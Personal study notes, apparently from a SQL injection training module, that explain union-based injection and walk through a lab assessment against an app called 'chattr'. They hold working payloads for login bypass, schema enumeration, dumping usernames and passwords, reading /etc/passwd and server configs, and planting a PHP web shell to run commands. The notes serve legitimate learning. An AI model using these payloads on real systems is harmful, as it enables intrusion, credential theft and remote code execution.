#CWES #SQLi #mysql

#### Lessons:
- quotes matter a lot in our payload, sometimes table names need them sometimes they dont.
- Be very aware of which schemes you are working in
- group_concat() is very usefull in union based sqli, it lets us get multiples table/column names in one query.
- Care aboute the comment-type we use, we can get different responses based on if we use `-- or -- - or #` as comment
- When manually looking for columns in a table with union select, remember that we have to use the same datatype as the other select statement. Easy way to do this is to use the `null` value or the "order-by" trick.


NOTE on comments in SQL:
- In MySQL, `--` starts a comment **only when it is immediately followed by whitespace or a control character**. So `--` might not work, but `-- -` or `--%20` might work.
- When using `#` as the comment sign and we send the payload via the browser, it might be handles as a **fragment identifier** and may not be sent to the backend. But if we url-endcode it, `%23` it might work.  

#### Payloads:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

#### Concept: 
- Application uses a database to provide dynamic funtionalities, if userinput is not handled correctly, which can lead to the client executing database commands -> which we can exploit.
- SQLi can lead to: leak of sensitive information and elevation of privileges. 
- Cause of SQLi: Poorly coded web app or poorly secured back-end server and database. 

- **SQL = Relational databases**
- **NoSQL = Non-relational databases**

- SQL syntax of different databases may differ, but they all require to follow:  https://en.wikipedia.org/wiki/ISO/IEC_9075 



#### Mysql
- Any non-zero value is true (true=1), false is signified by 0.
- Note: logging into mysql might require --skip-ssl option to work. 
- AND operation takes precedence over OR operation. 


#### SQLi basics:
![[Pasted image 20260203181503.png]]

**In-band:**
- Output of the new query is printed to the front end, making it easier to debug if our query works.

- **Union Based**: We may have to spesify where the query output is to be printed.  -> This is the only type explored in this module 
- **Error based**: When we can get the SQL errors in the front-end, so we can intentionally create queries that generate errors. 

**Blind:**
- Cannot see a direct output printed to the frontend.

- **Boolean based:** SQL conditional statements to control whether a page returns output, Example: return intended query output if our logical statement is true, else do not show output. 
- **Time based:** SQL conditional statements that delay the page response if the conditional statement returns true, using sleep().

**Out-of-band:**
- Cannot get direct access to query output, whatsoever, so have to be creative to evaluate the response of our modified query, example direct output to a remote location. 

#####  SQLi examples

**Example:**
```sql
SELECT * FROM logins WHERE username='admin' AND password = 'admin';
```

Payload:
```
admin'#
```

Result:
```sql
SELECT * FROM logins WHERE username='admin'#' AND password = 'qwe';
```


**Example:**
```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = '21232f297a57a5a743894a0e4a801fc3';
```

Payload:
```
'OR id=5)#
```

Result:
```sql
SELECT * FROM logins WHERE (username=''OR id=5)#' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';
```

#### Union clause SQLi
- UNION clause:  used to combine results from multiple SELECT statements.  
- The data types of the selected columns (from a UNION clause) on all positions should be the same.
- The data we SELECT with the UNION clause need to have the same number of columns 

- To bypass the type and column count restrictions of the UNION clause, we can SELECT "junk" strings.

IDEA: "escape" the indented query, and UNION our own query with it. 

**First step:** Find out the number of columns in the intended query.

Example payload: 
```sql
' ORDER BY 1#
```
- Closing the ''s, and ordering by the first column 
- Then try order by 2, then 3 and so on.
- When we get an error with this query, we know we have reached the limit of the column length. 

**Second step:** Figure out which columns from the table gets queried into the site.

Example payload:
```sql
' UNION SELECT 1,2,3,4#
```

Portcode 2, port city: 3, port volume: 4.

Can then try to query interesting info from the database, example:
- user(), version, etc. 

#### Enumerating DBMS:

**MYSQL version**
![[Pasted image 20260207145448.png]]

**INFORMATION_SCHEMA:**
```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Things we are interested in:
- Database names
- Table names 
- Columns names

**Example:**
- Find the schemata
```sql
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA#
```

- Find the tables
```sql
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,database() from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'#

```

- Find column names
```sql
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'#
```

- Get data we are interested in
```sql
' UNION select 1,password,username,4 FROM users#
```


#### Exploiting SQLi 

**Reading files:**
- Check privileges of the database user (Not all users can read code)
- Can us example: `SELECT LOAD_FILE('/etc/passwd');` to read files 

```
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4#
```

```sql
' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

**Writing files**
**Conditions to write to files in MySQL:**
1. User with `FILE` privilege enabled

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

If the value of  SECURE_FILE_PRIV is empty, we can read/write to any location. 

2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

Taking a select query and writing the output to a file:
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

**One of the main ways to exploit sqli-writing-to-files, is to write a webshell into the web root(base web directory for the web server).**

**Basic php webshell:**
```php
<?php system($_REQUEST[0]); ?>
```

Injecting the shell into a file via a sqli ex.
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

We can then access the shell via:
```
http://SERVER_IP:PORT/shell.php?0=id
```

NOTE: 
To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`


#### Mitigating SQL injection:

- Sanitize the characters that gets sent into a input field: `;,:'"?/&` etc
- User that sends queries to the database has minimal permissions 
- Web application firewall (WAF) - to detect malicious input and reject any HTTP containing them 


#### Assessment:
```
admin' AND 1=1 -- -
admin' AND 1=2 -- - 
admin" AND 1=1 -- - 
admin" AND 1=2 -- - 

```

```
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -
' ORDER BY 4 -- -
' ORDER BY 5 -- -
```

invoke key payload:
`AAAA-AAAA-1111') OR 1=1-- —`

We should get a response that the have successfully created a user. 

For the search api:
- We see that a normal search gives us 200, but if we try: `abc'` then it responds with http 500
- So we assume there is sqli here. 
- doing `') ORDER BY 1-- -` ... `') ORDER BY 5-- -` we can confirm that we are dealing with a sql query fetching 4 columns. (because order by 5 gave error and 1-4 did not).
- Then we do a `') UNION SELECT 1,2,3,4#` to see how the 4 columns are used and if any shows on screen -> We see 3 and 4 shows up in the message log. 

Now we have a reliable way to executing sql code and displaying them on screen, we look for some basics:
- DB version: 10.11.11-MariaDB-0+deb12u1 - @@version
- Schema_name: chattr - `' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA#`
- Tabel_name: Messages
- databasename: chattr 
```sql
') UNION select 1,2,TABLE_NAME,database() from INFORMATION_SCHEMA.TABLES where table_schema='chattr'#
```

Columns:
- MessageID
- FromID
- ToID
- Message
- SentTime
```sql
') UNION select 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Messages'#
```

All tables:
- Users
- InvitationCodes
- Messages
```sql
') UNION SELECT 1,2,TABLE_NAME,4  
FROM INFORMATION_SCHEMA.TABLES  
WHERE TABLE_SCHEMA = database()#
```

All tables of Users table:
- UserID 
- Username
- Password
- InvitationCode
- AccountCreated

```
') UNION select 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Users'#
```


Dump the creds from the user table:
```
') UNION select 1,2,Password,Username from Users#
```


We can also read files via sqli:
```sql
') UNION SELECT 1,2, LOAD_FILE('/etc/nginx/sites-enabled/default'), 4#
```
- We find the web root folder: root /var/www/chattr-prod 


We should also be able to write to files:
```sql
') UNION SELECT 1,2,variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"#
```
(Shows SECURE_FILE_PRIV and empty)


We know all we need to upload a webshell to the web root folder, and from here we find the flag:
```
') union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/chattr-prod/shell.php'-- -
```

```
/shell.php?0=cd ../../..;cat flag_876a4c.txt
```
